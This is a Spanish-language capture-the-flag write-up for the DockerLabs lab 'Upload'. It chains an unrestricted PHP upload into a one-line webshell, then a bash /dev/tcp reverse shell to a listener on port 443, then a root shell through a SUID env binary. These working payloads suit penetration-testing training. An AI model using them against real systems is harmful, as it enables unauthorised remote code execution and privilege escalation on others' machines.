---
Estado: Completado
Plataforma: DockerLabs
SO: Linux
Dificultad: Fácil
VectorInicial: Unrestricted File Upload -> RCE
Privesc: sudo `env`
Fecha: 2026-02-04
---

# Upload

## Reconocimiento inicial

Se enumeran puertos y servicios:

```bash
nmap -sSVC -n -Pn 172.17.0.2
```

El único servicio expuesto es HTTP en el puerto `80`.

## Enumeración web

La aplicación ofrece directamente una funcionalidad de subida de ficheros. Se plantea subir una webshell o un fichero PHP con ejecución de comandos.

Ejemplo mínimo:

```php
<?php system($_GET["cmd"]); ?>
```

También puede usarse una webshell más completa, como p0wny-shell.

## Descubrimiento de la ruta de subida

Tras subir el fichero, la aplicación no indica la ruta final, así que se enumeran directorios con `dirb`:

```bash
dirb http://172.17.0.2
```

Se localiza el directorio `/uploads/`, donde aparece el fichero subido.

## Ejecución remota de comandos

Al acceder al archivo PHP en `/uploads/`, se obtiene ejecución de comandos.

Sin embargo, para trabajar con más comodidad conviene convertirlo a reverse shell.

## Reverse shell

Comando lanzado desde la webshell:

```bash
bash -c 'exec bash -i &>/dev/tcp/172.17.0.1/443 <&1'
```

Mientras tanto, se deja un listener preparado con `penelope` en el puerto `443`.

## Escalada de privilegios

Tras obtener shell interactiva, se revisan privilegios y se observa que el binario `env` tiene SUID.

La escalada resulta directa:

```bash
env /bin/sh -p
```

Con ello se obtiene shell privilegiada.

## Conclusión

Cadena de ataque:

1. Subida arbitraria de archivo PHP.
2. Descubrimiento de la carpeta `/uploads/`.
3. Ejecución remota de comandos.
4. Conversión a reverse shell.
5. Escalada mediante SUID en `env`.

Laboratorio simple, pero bastante didáctico para recordar por qué dejar subir PHP ejecutable es una idea criminal.

---
Si te gustó, puedes invitarme a un café.
[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/C0C61UHTB1)
